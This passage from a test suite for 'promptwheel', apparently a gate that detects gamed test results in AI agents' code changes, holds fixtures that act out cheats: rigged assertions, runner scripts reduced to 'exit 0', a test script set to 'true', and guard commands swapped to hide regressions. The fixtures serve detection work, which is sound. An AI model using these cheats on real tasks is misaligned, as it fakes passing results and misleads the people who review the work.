  assert.equal(r.verdict, 'inconclusive');
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  const cli = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(cli.code, 3, cli.out); assert.match(cli.out, /INCONCLUSIVE/i);
  // the declared override covers exactly this uncertainty: 0.7.9 left it with no way to pass
  const a = check({ repo: d, base: 'HEAD~1', head: 'HEAD', allow: 'expectation was wrong' });
  assert.equal(a.verdict, 'pass', JSON.stringify(a));
  assert.deepEqual(a.allowed.cleared, ['tests_pass']); assert.equal(a.allowed.reason, 'expectation was wrong');
  assert.equal(a.metrics[0].unprovable, false); assert.equal(a.metrics[0].allowed, true);
  assert.equal(conformsToContract(a).ok, true, conformsToContract(a).errors.join('; '));
  const cliA = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--allow', 'expectation was wrong']);
  assert.equal(cliA.code, 0, cliA.out); assert.match(cliA.out, /allowed: tests_pass/);
  // unprovable:false is only a conforming shape when a declared override produced it
  const stripped = JSON.parse(JSON.stringify(a)); delete stripped.metrics[0].allowed;
  assert.equal(conformsToContract(stripped).ok, false);
  assert.match(conformsToContract(stripped).errors.join('; '), /allowed must be true/);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------- review 5: an unknown flag exits 64 on every command
test('cli: an unknown flag is a usage error (64) on every command, never silently ignored; --help after a command is help', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  for (const argv of [['run', '--bogus-flag', '--no-record'], ['init', '--preset', 'antihack', '--forced'], ['lock', '--nope']]) {
    const r = pw(d, argv);
    assert.equal(r.code, 64, `${argv.join(' ')} -> ${r.out}`);
    assert.match(r.out, /unknown flag --/, argv.join(' ')); assert.match(r.out, /promptwheel --help/);
    assert.doesNotMatch(r.out, /at .*promptwheel\.mjs:\d+/, 'no stack trace');
  }
  let r = pw(d, ['run', '--help']);
  assert.equal(r.code, 0, r.out); assert.match(r.out, /promptwheel run/);
  // the documented flags still work, with and without values
  r = pw(d, ['run', '--working', '--no-record', '--json', '--no-detect-gaming', '--repeat', '1']);
  assert.equal(r.code, 0, r.out); assert.equal(JSON.parse(r.out).verdict, 'pass');
  r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record', '--allow', 'a reason', '--markdown']);
  assert.equal(r.code, 0, r.out);
  r = pw(d, ['init', '--list']);
  assert.equal(r.code, 0, r.out); assert.match(r.out, /supply-chain/);
  rmSync(d, { recursive: true, force: true });
});

test('cli: a flag with a missing or unusable value is a usage error (64, one line), never a verdict', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'b\n'); commitAll(d, 'head');   // two commits: a bare `run` has something to compare
  const bad = [['run', '--repeat', 'abc'], ['run', '--repeat', '1.5'], ['run', '--repeat', '-2'], ['run', '--repeat'], ['run', '--allow'], ['run', '--allow', '   '], ['run', '--allow', ''],
    ['run', '--allow', '--json'], ['run', '--base'], ['run', '--head'], ['run', '--base', '--head', 'HEAD'], ['run', '--head', ' '], ['init', '--force', '--preset']];
  for (const argv of bad) {
    const r = pw(d, [...argv]);
    assert.equal(r.code, 64, `${argv.join(' ')} -> ${r.out}`);
    assert.match(r.out, /^promptwheel (run|init): --(repeat|allow|base|head|preset) needs /, argv.join(' '));
    assert.equal(r.out.trim().split('\n').length, 1, `one line: ${r.out}`);
  }
  assert.match(pw(d, ['run', '--repeat', 'abc']).out, /--repeat needs a whole number, 1 or more \(got "abc"\)/);
  assert.match(pw(d, ['run', '--allow']).out, /--allow needs a reason/);
  assert.match(pw(d, ['run', '--base']).out, /--base needs a ref/);
  const ok = pw(d, ['run', '--working', '--repeat', '2', '--allow', 'a reason', '--json']);   // good values still run
  assert.equal(ok.code, 0, ok.out); assert.equal(JSON.parse(ok.out).repeat, 2);
  const empty = pw(d, ['run', '--base', '', '--head', 'HEAD', '--json']);   // the Action passes an empty base outside a pull request: the default ref
  assert.equal(empty.code, 0, empty.out); assert.notEqual(JSON.parse(empty.out).base, JSON.parse(empty.out).head);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------- 0.8.0: the smaller surface
test('cli: the removed commands and presets are usage errors (64), never a verdict; the kept presets remain', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  for (const cmd of ['improve', 'insights', 'guards', 'conformance']) {
    const r = pw(d, [cmd]);
    assert.equal(r.code, 64, `${cmd} -> ${r.out}`); assert.match(r.out, new RegExp(`unknown command: ${cmd}`));
  }
  const listed = pw(d, ['init', '--list']).out.split('\n').filter((l) => l.startsWith('  ')).map((l) => l.trim().split(/\s+/)[0]);
  assert.deepEqual(listed.sort(), ['antihack', 'no-ai-tells', 'supply-chain']);
  for (const preset of ['tests-pass', 'lint', 'bundle-size', 'security', 'llm-eval', 'security-antihack']) {
    const r = pw(d, ['init', '--preset', preset, '--force']);
    assert.equal(r.code, 64, `${preset} -> ${r.out}`); assert.match(r.out, /unknown preset/);
  }
  rmSync(d, { recursive: true, force: true });
});

test('run: --no-record stays accepted (Sawbuck passes it on every check) and no run writes a record', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'fix');
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']).code, 0);
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json']).code, 0);
  assert.equal(existsSync(join(d, '.promptwheel')), false);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------- review 5: the plugin's versions agree
test('plugin: the plugin version matches the marketplace entry', () => {
  const root = join(dirname(ENGINE), '..');
  const plugin = JSON.parse(readFileSync(join(root, 'plugins/promptwheel/.claude-plugin/plugin.json'), 'utf8'));
  const market = JSON.parse(readFileSync(join(root, '.claude-plugin/marketplace.json'), 'utf8'));
  assert.equal(market.plugins.find((x) => x.name === 'promptwheel').version, plugin.version, 'plugin.json and marketplace.json agree on the version');
});

// ------------------------------------------------------ review 4: check({ repo }) from a subdirectory
test('check: a repo path that names a subdirectory gates at the repository root', () => {
  const d = tmpRepo([TODOS]);
  mkdirSync(join(d, 'packages', 'api'), { recursive: true });
  writeFileSync(join(d, 'packages', 'api', 'app.js'), 'a // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'packages', 'api', 'app.js'), 'a\n');
  const r = check({ repo: join(d, 'packages', 'api'), working: true });
  assert.equal(r.verdict, 'pass', JSON.stringify(r.metrics));
  assert.equal(r.metrics[0].name, 'todos', 'the ROOT config was used, not an auto-config of the subdir');
  assert.equal(existsSync(join(d, 'packages', 'api', '.promptwheel')), false, 'nothing is written in the subdir');
  rmSync(d, { recursive: true, force: true });
});

// -------------------------------------------- review 4: one patched worktree re-proves every improved metric
test('gaming: two improved metrics are re-proven in ONE source-only checkout (setup runs 3 times, not 4)', () => {
  const log = join(mkdtempSync(join(tmpdir(), 'pw-setups-')), 'setups.log');
  const d = tmpRepo([
    TODOS,
    { name: 'fixme', cmd: 'grep -rn FIXME . --include=*.js 2>/dev/null | wc -l', extract: 'number', direction: 'down', guard: true },
  ]);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  cfg.setup = `echo setup >> ${JSON.stringify(log)}`;
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // FIXME\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'fix both');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r.metrics));
  for (const m of r.metrics) { assert.equal(m.status, 'improved', m.name); assert.equal(m.gamed, false, m.name); assert.equal(m.retained, 1, m.name); }
  const setups = readFileSync(log, 'utf8').split('\n').filter(Boolean).length;
  assert.equal(setups, 3, `base + head + ONE source-only checkout, got ${setups}`);
  rmSync(d, { recursive: true, force: true }); rmSync(dirname(log), { recursive: true, force: true });
});

// ------------------------------------------- launch audit 2026-11-04: holes found by running the published packages
const repoWith = (files) => {
  const d = mkdtempSync(join(tmpdir(), 'pw-hole-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  for (const [f, c] of Object.entries(files)) { mkdirSync(join(d, dirname(f)), { recursive: true }); writeFileSync(join(d, f), c); }
  commitAll(d, 'base'); return d;
};
const NODE_TEST = (body) => `require('node:test').test('t', () => require('node:assert').equal(${body}))\n`;
const js = (test) => ({ 'package.json': JSON.stringify({ name: 'a', scripts: { test } }), 'src/a.js': 'exports.f = () => 1\n', 'test/a.test.js': NODE_TEST("require('../src/a.js').f(), 2") });
const gateRun = (d, extra = []) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json', ...extra]); return { code: r.code, rep: JSON.parse(r.out) }; };
const cfgOf = (cmd) => JSON.stringify({ repeat: 1, metrics: [{ name: 'tests_pass', cmd, extract: 'exit', direction: 'pass', guard: true }] });

// Found setting up a bench on public agent runs whose workspaces keep a script-style test.py (proof-bench/rival-set,
// 2026-11-12): the file rule knew test.js, test.go, test.rb, test_*.py and *_test.py, and not a Python file named
// test.py or tests.py. Django writes a tests.py into every app, so a win from editing one read as earned.
// The name alone cannot decide it: Jinja keeps production code in src/jinja2/tests.py (its template tests, with
// functions named test_odd and test_even). So the file's own imports decide.
const SAME_NUMBER = 'test "$(sed -n \'s/^RESULT = //p\' "$1")" = "$(sed -n \'s/^EXPECT = //p\' "$2")"\n';
// a gamed verdict prints a line after the JSON, so the report is cut out of the output (reportOf), not parsed whole
const gateRead = (d) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json']); return { code: r.code, rep: reportOf(r.out) }; };
test('a Python tests.py that imports a test framework is test-side: a win from editing it reads gamed, the real fix reads earned; a production module named tests.py stays source', () => {
  const app = () => repoWith({ 'promptwheel.config.json': cfgOf('sh check.sh polls/calc.py polls/tests.py'), 'check.sh': SAME_NUMBER,
    'polls/calc.py': 'RESULT = 0\n', 'polls/tests.py': 'from django.test import TestCase\nEXPECT = 4\n' });
  let d = app();
  writeFileSync(join(d, 'polls/tests.py'), 'from django.test import TestCase\nEXPECT = 0\n'); writeFileSync(join(d, 'polls/calc.py'), 'RESULT = 0\n# looked at\n'); commitAll(d, 'make it green');
  let r = gateRead(d); assert.equal(r.rep.verdict, 'gamed', JSON.stringify(r.rep.metrics)); assert.equal(r.code, 2);
  d = app(); writeFileSync(join(d, 'polls/calc.py'), 'RESULT = 4\n'); commitAll(d, 'fix');
  r = gateRead(d); assert.equal(r.rep.verdict, 'pass', 'the honest fix in the same layout');
  // the import can arrive in the same change: a file that becomes a test module is one
  d = repoWith({ 'promptwheel.config.json': cfgOf('sh check.sh calc.py test.py'), 'check.sh': SAME_NUMBER, 'calc.py': 'RESULT = 0\n', 'test.py': 'EXPECT = 4\n' });
  writeFileSync(join(d, 'test.py'), 'import unittest\nEXPECT = 0\n'); writeFileSync(join(d, 'calc.py'), 'RESULT = 0\n# looked at\n'); commitAll(d, 'make it green');
  r = gateRead(d); assert.equal(r.rep.verdict, 'gamed');
  // production code named tests.py: no test framework imported, so a fix inside it is a source fix
  d = repoWith({ 'promptwheel.config.json': cfgOf('sh check.sh src/pkg/tests.py spec.txt'), 'check.sh': SAME_NUMBER,
    'src/pkg/tests.py': 'import operator\ndef test_odd(value):\n    return value % 2 == 1\nRESULT = 0\n', 'spec.txt': 'EXPECT = 4\n' });
  writeFileSync(join(d, 'src/pkg/tests.py'), 'import operator\ndef test_odd(value):\n    return value % 2 == 1\nRESULT = 4\n'); commitAll(d, 'fix');
  r = gateRead(d); assert.equal(r.rep.verdict, 'pass', JSON.stringify(r.rep.metrics));
});

test('a runner script the test command runs, named like one (test.sh, run-tests.sh, runtests.py), is test-side; a script with another name stays source', () => {
  const RUNNER = '[ "$(cat app.txt)" = "answer=2" ]\n';
  const base = (cmd, name) => repoWith({ 'promptwheel.config.json': cfgOf(cmd), [name]: RUNNER, 'app.txt': 'answer=1\n' });
  // the cheat edits only the runner
  let d = base('sh test.sh', 'test.sh');
  writeFileSync(join(d, 'test.sh'), '[ "$(cat app.txt)" = "answer=1" ]\n'); commitAll(d, 'make it green');
  let r = gateRead(d); assert.equal(r.rep.verdict, 'gamed', JSON.stringify(r.rep.metrics));
  // the runner and a source file, with ./ in the command
  d = base('bash ./scripts/run-tests.sh', 'scripts/run-tests.sh');
  writeFileSync(join(d, 'scripts/run-tests.sh'), 'exit 0\n'); writeFileSync(join(d, 'app.txt'), 'answer=1\nmore\n'); commitAll(d, 'make it green');
  r = gateRead(d); assert.equal(r.rep.verdict, 'gamed');
  // the honest fix
  d = base('sh test.sh', 'test.sh'); writeFileSync(join(d, 'app.txt'), 'answer=2\n'); commitAll(d, 'fix');
  r = gateRead(d); assert.equal(r.rep.verdict, 'pass');
  // through npm: the config says `npm test`, and package.json names the runner
  d = repoWith({ 'promptwheel.config.json': cfgOf('npm test --silent'), 'package.json': JSON.stringify({ name: 'a', scripts: { test: 'sh ./run-tests.sh' } }), 'run-tests.sh': RUNNER, 'app.txt': 'answer=1\n' });
  writeFileSync(join(d, 'run-tests.sh'), 'exit 0\n'); commitAll(d, 'make it green');
  r = gateRead(d); assert.equal(r.rep.verdict, 'gamed');
  // a program that checks itself is not a runner: the command runs it, its name does not say test, a fix in it is earned
  d = repoWith({ 'promptwheel.config.json': cfgOf('sh tool.sh --self-check'), 'tool.sh': 'exit 1\n' });
  writeFileSync(join(d, 'tool.sh'), 'exit 0\n'); commitAll(d, 'fix');
  r = gateRead(d); assert.equal(r.rep.verdict, 'pass', JSON.stringify(r.rep.metrics));
});

test('a test command edited in package.json cannot carry a win; a real source fix still does', () => {
  let d = repoWith({ ...js('node --test'), 'promptwheel.config.json': cfgOf('npm test --silent') });
  const pkg = JSON.parse(readFileSync(join(d, 'package.json'), 'utf8'));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ ...pkg, scripts: { test: 'true' } })); commitAll(d, 'cheat');
  assert.equal(gateRun(d).rep.verdict, 'gamed');
  d = repoWith({ ...js('node --test'), 'promptwheel.config.json': cfgOf('npm test --silent') });
  const p2 = JSON.parse(readFileSync(join(d, 'package.json'), 'utf8'));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ ...p2, dependencies: {} }));
  writeFileSync(join(d, 'src/a.js'), 'exports.f = () => 2\n'); commitAll(d, 'real fix, package.json edited too');
  assert.equal(gateRun(d).rep.verdict, 'pass');
});

test('pytest options in pyproject.toml cannot carry a win', () => {
  const py = { 'pyproject.toml': '[project]\nname = "a"\n\n[tool.x]\ny = 1\n', 'promptwheel.config.json': cfgOf("sh -c 'grep -q skipall pyproject.toml'") };
  const d = repoWith(py);
  writeFileSync(join(d, 'pyproject.toml'), '[project]\nname = "a"\n\n[tool.pytest.ini_options]\naddopts = "skipall"\n\n[tool.x]\ny = 1\n'); commitAll(d, 'cheat');
  assert.equal(gateRun(d).rep.verdict, 'gamed');
});

test('moving a file out of a protected path touches that path', () => {
  const d = repoWith({ 'src/auth/login.js': 'x\n', 'promptwheel.config.json': JSON.stringify({ ...JSON.parse(cfgOf('true')), mandates: [{ name: 'auth', paths: ['src/auth/**'], reason: 'auth' }] }) });
  execFileSync('git', ['mv', 'src/auth/login.js', 'src/login.js'], { cwd: d }); commitAll(d, 'move');
  const r = gateRun(d); assert.equal(r.code, 1); assert.ok(r.rep.mandates.some((m) => m.name === 'auth'));
});

test('the preset freezes the contract: weakening it alone fails, a person lifts it with --allow, a trailer cannot', () => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a' }) });
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
  writeFileSync(f, JSON.stringify({ ...c, mandates: [] }, null, 2)); commitAll(d, 'drop the rules\n\nPromptwheel-Allow: because');
  assert.equal(gateRun(d).code, 1, 'a trailer does not lift it');
  assert.equal(gateRun(d, ['--allow', 'a person retired these']).code, 0);
});

test('a green held by test edits gets a note, not a verdict; an honest fix gets neither', () => {
  const pass = { 'package.json': JSON.stringify({ name: 'a', scripts: { test: 'node --test' } }), 'src/a.js': 'exports.f = () => 2\n', 'test/a.test.js': NODE_TEST("require('../src/a.js').f(), 2"), 'promptwheel.config.json': cfgOf('npm test --silent') };
  let d = repoWith(pass);
  writeFileSync(join(d, 'src/a.js'), 'exports.f = () => 3\n'); writeFileSync(join(d, 'test/a.test.js'), NODE_TEST('1, 1')); commitAll(d, 'break it, neuter the test');
  let r = gateRun(d); assert.equal(r.rep.verdict, 'pass'); assert.equal(r.rep.metrics[0].heldByTestEdit, true);
  d = repoWith(pass);
  writeFileSync(join(d, 'src/a.js'), 'exports.f = () => 2 // same\n'); writeFileSync(join(d, 'test/a.test.js'), NODE_TEST("require('../src/a.js').f(), 2") + '// more\n'); commitAll(d, 'honest');
  r = gateRun(d); assert.equal(r.rep.metrics[0].heldByTestEdit, undefined);
});

test('deriveVerdict: a tripwire moving is not a win over a test that never ran', () => {
  assert.equal(deriveVerdict([{ name: 't', guard: true, ok: true, status: 'unchanged', inert: true }, { name: 'c', guard: true, ok: true, status: 'improved', tripwire: true }]), 'inconclusive');
});

test('a report guard tells you and does not fail; a plain message says what changed', () => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a' }) });
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
  writeFileSync(f, JSON.stringify({ ...c, mandates: c.mandates.filter((m) => m.name !== 'contract-frozen'), metrics: c.metrics.map((m) => (m.name === 'dependency_entries' ? { ...m, report: true } : m)) }, null, 2)); commitAll(d, 'report mode');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', dependencies: { ms: '2.1.3' } })); commitAll(d, 'dep');
  const r = gateRun(d);
  const dep = r.rep.metrics.find((m) => m.name === 'dependency_entries');
  assert.equal(dep.noted, true); assert.equal(dep.status, 'regressed');
  assert.ok(r.rep.explained.some((x) => x.what === 'a new dependency' && x.noted));
});
test('a report flag does not soften a guard that is not marked', () => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a' }) });
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', scripts: { postinstall: 'x' } })); commitAll(d, 'script');
  const r = gateRun(d); assert.equal(r.code, 1); assert.ok(r.rep.explained.some((x) => x.what === 'a new install script'));
});
test('approval on a PR: the newest comment from someone with write access; never a bot or a drive-by', () => {
  const c = (body, assoc = 'OWNER', type = 'User', login = 'pat') => ({ body, author_association: assoc, user: { type, login } });
  assert.equal(allowFromComments([]), '');
  assert.equal(allowFromComments([c('looks fine')]), '');
  assert.equal(allowFromComments([c('sawbuck-allow: x', 'NONE')]), '', 'a stranger');
  assert.equal(allowFromComments([c('sawbuck-allow: x', 'OWNER', 'Bot')]), '', 'a bot');
  assert.equal(allowFromComments([c('sawbuck-allow:   ')]), '', 'no reason');
  assert.equal(allowFromComments([c('sawbuck-allow: old'), c('nice\nsawbuck-allow: added ms for parsing')]), 'added ms for parsing (approved by pat)');
});

// ---------------------------------------------------- 0.8.1: claims the audit checked against the code
const SHGUARD = { name: 'tests_pass', cmd: 'sh check.sh', extract: 'exit', direction: 'pass', guard: true };
// a repo whose guard runs check.sh; `head` rewrites the config and check.sh in one commit
function swapRepo({ baseExit, headExit, headCmd, viaExtends = false }) {
  const d = mkdtempSync(join(tmpdir(), 'pw-swap-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  const write = (cmd) => {
    const metrics = [{ ...SHGUARD, cmd }];
    if (viaExtends) {
      writeFileSync(join(d, 'base.json'), JSON.stringify({ metrics }));
      writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: './base.json' }));
    } else writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics }));
  };
  write(SHGUARD.cmd); writeFileSync(join(d, 'check.sh'), `exit ${baseExit}\n`); commitAll(d, 'base');
  write(headCmd); writeFileSync(join(d, 'check.sh'), `exit ${headExit}\n`); commitAll(d, 'head');
  return d;
}
test('gate integrity: pointing a guard at another command to hide a regression reads GAMED, directly or through extends', () => {
  for (const viaExtends of [false, true]) {
    const d = swapRepo({ baseExit: 0, headExit: 1, headCmd: 'true', viaExtends });
    const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json']);
    assert.equal(r.code, 2, `extends=${viaExtends}: ${r.out}`);
    const rep = reportOf(r.out);
    assert.equal(rep.gate.changed, true, 'the command is part of the gate fingerprint');
    assert.ok(rep.gate.weakened.some((w) => w.name === 'tests_pass' && w.change === 'guard-edited'), JSON.stringify(rep.gate));
    assert.equal(conformsToContract(rep).ok, true, conformsToContract(rep).errors.join('; '));
    assert.match(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD']).out, /GATE WEAKENED, the guard "tests_pass" was edited/);
    const a = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json', '--allow', 'the old command was wrong']);
    assert.equal(a.code, 0, a.out); assert.ok(reportOf(a.out).allowed.cleared.includes('gate'));
    rmSync(d, { recursive: true, force: true });
  }
});
test('gate integrity: a red guard turned green by swapping its command reads GAMED; an honest swap is only a gate change', () => {
  let d = swapRepo({ baseExit: 1, headExit: 1, headCmd: 'true' });
  let r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json']);
  assert.equal(r.code, 2, r.out);
  rmSync(d, { recursive: true, force: true });
  d = swapRepo({ baseExit: 0, headExit: 0, headCmd: 'sh ./check.sh' });
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json']);
  assert.equal(r.code, 0, r.out);
  const rep = reportOf(r.out);
  assert.equal(rep.gate.changed, true); assert.equal(rep.gate.weakened, undefined);
  rmSync(d, { recursive: true, force: true });
});

test('gate integrity: replacing the placeholder test command init writes is setup, not gaming', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-placeholder-'));
  const g = (...x) => execFileSync('git', x, { cwd: d, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'], env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_AUTHOR_NAME: 'a', GIT_AUTHOR_EMAIL: 'a@b.c', GIT_COMMITTER_NAME: 'a', GIT_COMMITTER_EMAIL: 'a@b.c' } });
  g('init', '-q'); writeFileSync(join(d, 'app.py'), 'x = 1\n'); g('add', '-A'); g('commit', '-qm', 'base');
  assert.equal(pw(d, ['init']).code, 0);
  const cfgPath = join(d, 'promptwheel.config.json');
  const cfg = JSON.parse(readFileSync(cfgPath, 'utf8'));
  const ph = cfg.metrics.find((m) => /set your test command/.test(m.cmd));
  assert.ok(ph && ph.guard === true, 'init wrote the placeholder guard');
  g('add', '-A'); g('commit', '-qm', 'init');
  ph.cmd = 'true && echo 1'; writeFileSync(cfgPath, JSON.stringify(cfg, null, 2));
  g('add', '-A'); g('commit', '-qm', 'set the real test command');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json', '--no-auto']);
  const rep = reportOf(r.out);
  assert.notEqual(rep.verdict, 'gamed', r.out);
  assert.equal(rep.gate.changed, true); assert.equal(rep.gate.weakened, undefined);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------- a change is judged by the gate that was in force before it
const TESTS_PASS = { name: 'tests_pass', cmd: 'node app.test.js', extract: 'exit', direction: 'pass', guard: true };
const GOOD_SRC = 'module.exports = { add: (a, b) => a + b };\n', BAD_SRC = 'module.exports = { add: (a, b) => a - b };\n';
const HONEST_TEST = "require('assert').strictEqual(require('./src').add(2, 3), 5);\n";
const RIGGED_TEST = "require('assert').strictEqual(require('./src').add(2, 3), -1);\n";
const cfgFile = (d, cfg) => writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, ...cfg }));
const lastChange = (d) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--json']); return { ...r, rep: r.code === 64 ? null : reportOf(r.out) }; };
// a repo with a source file and an honest test: `cfg` null leaves it with no config (zero-config runs `npm test`)
function srcRepo(src, cfg) {
  const d = bareRepo();
  if (cfg) cfgFile(d, cfg);
  else writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'zc', scripts: { test: 'node app.test.js' } }));
  writeFileSync(join(d, 'src.js'), src); writeFileSync(join(d, 'app.test.js'), HONEST_TEST);
  commitAll(d, 'base');
  return d;
}
test('first config: a config added with tests_pass set to `true` while the source breaks reads GAMED', () => {
  const d = srcRepo(GOOD_SRC, null);
  cfgFile(d, { metrics: [{ ...TESTS_PASS, cmd: 'true' }] });
  writeFileSync(join(d, 'src.js'), BAD_SRC); commitAll(d, 'add a config and break the source');
  const r = lastChange(d);
  assert.equal(r.code, 2, r.out);
  assert.ok(r.rep.gate.weakened.some((w) => w.name === 'tests_pass' && w.change === 'guard-edited' && w.status === 'regressed'), JSON.stringify(r.rep.gate));
  assert.equal(r.rep.gate.fingerprint.base, null, 'there was no config file at base');
  assert.equal(conformsToContract(r.rep).ok, true, conformsToContract(r.rep).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('first config: one that keeps the detected test command, or replaces the placeholder, passes', () => {
  let d = srcRepo(GOOD_SRC, null);                       // `init` keeps the detected command
  assert.equal(pw(d, ['init', '--no-agent-block']).code, 0);
  assert.equal(JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics[0].cmd, 'npm test --silent');
  commitAll(d, 'init');
  let r = lastChange(d);
  assert.equal(r.code, 0, r.out); assert.equal(r.rep.gate.weakened, undefined, JSON.stringify(r.rep.gate));
  writeFileSync(join(d, 'src.js'), BAD_SRC); commitAll(d, 'break the source');   // and the config it wrote still guards
  assert.equal(lastChange(d).code, 1);
  rmSync(d, { recursive: true, force: true });
  d = bareRepo();                                         // nothing to detect at base: the zero-config gate was the placeholder
  writeFileSync(join(d, 'src.js'), GOOD_SRC); writeFileSync(join(d, 'app.test.js'), HONEST_TEST); commitAll(d, 'base');
  cfgFile(d, { metrics: [TESTS_PASS] }); commitAll(d, 'set the test command');
  r = lastChange(d);
  assert.equal(r.code, 0, r.out); assert.equal(r.rep.gate.weakened, undefined, JSON.stringify(r.rep.gate));
  rmSync(d, { recursive: true, force: true });
  d = bareRepo();                                         // the placeholder measured nothing, so its (absent) setup is no baseline either:
  writeFileSync(join(d, 'src.js'), BAD_SRC);              // a first config with the setup the suite needs, and a real fix, in one change
  writeFileSync(join(d, 'build.js'), "require('fs').writeFileSync('built.js', 'module.exports = 5;\\n');\n");
  writeFileSync(join(d, 'app.test.js'), "require('assert').strictEqual(require('./src').add(2, 3), require('./built.js'));\n");
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\nbuilt.js\n'); commitAll(d, 'base');
  cfgFile(d, { setup: 'node build.js', metrics: [TESTS_PASS] }); writeFileSync(join(d, 'src.js'), GOOD_SRC); commitAll(d, 'set up the gate and fix the bug');
  r = lastChange(d);
  assert.equal(r.code, 0, r.out); assert.match(r.rep.metrics[0].gamingReason, /the source earned it/);
  rmSync(d, { recursive: true, force: true });
});
test('gamingCheck: false set in the change that edits the test to pass does not switch the re-run off', () => {
  for (const base of [{ metrics: [TESTS_PASS] }, null]) {          // a committed config, and no config (zero-config)
    const d = srcRepo(BAD_SRC, base);                              // red: an honest test fails on the bug
    cfgFile(d, { metrics: [{ ...TESTS_PASS, cmd: base ? TESTS_PASS.cmd : 'npm test --silent', gamingCheck: false }] });
    writeFileSync(join(d, 'app.test.js'), RIGGED_TEST); commitAll(d, 'green the suite by editing the test');
    const r = lastChange(d);
    assert.equal(r.code, 2, `base config ${!!base}: ${r.out}`);
    const m = r.rep.metrics.find((x) => x.name === 'tests_pass');
    assert.equal(m.gamed, true); assert.match(m.gamingReason, /zero production-source files/);
    assert.equal(m.tripwire, undefined, 'the check that was on before the change stays on for it');
    rmSync(d, { recursive: true, force: true });
  }
});
test('gamingCheck: false set alongside a real source fix passes; a new test-side guard keeps its exemption', () => {
  const d = srcRepo(BAD_SRC, { metrics: [TESTS_PASS] });
  const ASSERTS = { name: 'asserts', cmd: 'grep -c strictEqual app.test.js', extract: 'number', direction: 'up', guard: true, gamingCheck: false };
  cfgFile(d, { metrics: [{ ...TESTS_PASS, gamingCheck: false }, ASSERTS] });
  writeFileSync(join(d, 'src.js'), GOOD_SRC); commitAll(d, 'fix the bug');
  let r = lastChange(d);
  assert.equal(r.code, 0, r.out);
  assert.match(r.rep.metrics.find((x) => x.name === 'tests_pass').gamingReason, /the source earned it/);
  writeFileSync(join(d, 'app.test.js'), HONEST_TEST + "require('assert').strictEqual(require('./src').add(0, 0), 0);\n"); commitAll(d, 'one more assertion');
  r = lastChange(d);                                               // gamingCheck: false was in force before this change: honoured
  assert.equal(r.code, 0, r.out);
